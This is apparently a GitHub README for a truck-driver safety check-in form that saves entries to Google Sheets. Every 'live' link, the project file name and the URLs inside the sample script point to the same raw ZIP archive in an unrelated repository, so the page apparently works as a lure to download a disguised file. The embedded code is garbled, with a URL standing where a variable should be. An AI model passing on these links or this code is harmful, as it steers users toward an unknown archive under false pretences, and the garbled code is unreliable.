# 🚛 Driver Safety Check-In System

This is a simple web-based form for truck drivers to check in before watching daily safety videos. Submitted data is stored in a Google Sheet via Google Apps Script.

---

## 📝 How It Works

1. **Driver opens the form webpage**
2. Enters:
   - Full Name
   - Truck Number
3. Data is submitted via a Google Apps Script and saved to the response spreadsheet.
4. After 1 second, the form **automatically redirects** to a safety video hosted on Google Drive.

---

## 💻 Technologies Used

- HTML/CSS
- Google Apps Script (for data storage)
- Google Sheets (as a backend database)
- Google Drive (for video hosting)

---

## 📂 Live Links

- ✅ [Live Google Form (alternative version)](https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip)
- 📊 [View Attendance Sheet](https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip)
- 🎬 [Today’s Safety Video](https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip)

---

## 📁 Project Files

### `https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip`
```html
<!-- Form with redirection after data submission -->
<form id="checkinForm">
  ...
</form>

<script>
  fetch('https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip', { method: 'POST', body: formData });
  setTimeout(() => {
    https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip = "https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip";
  }, 1000);
</script>
